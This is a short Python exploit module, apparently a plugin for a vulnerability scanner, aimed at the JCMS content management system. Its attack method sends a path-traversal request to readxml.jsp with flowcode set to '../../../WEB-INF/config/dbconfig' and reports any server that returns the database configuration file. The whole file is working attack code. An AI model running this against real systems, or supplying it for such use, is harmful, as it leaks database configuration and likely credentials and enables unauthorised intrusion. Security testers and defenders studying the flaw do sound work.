# coding:utf-8
import requests
import re

class Exploit:

    def attack(self, url):
        payload = "/jcms/workflow/design/readxml.jsp?flowcode=../../../WEB-INF/config/dbconfig"
        target = url + payload

        response = requests.get(target)
        if response.status_code == 200 and re.search(r'<driver-class>', response.text):
            return "[Database Config] {}".format(target)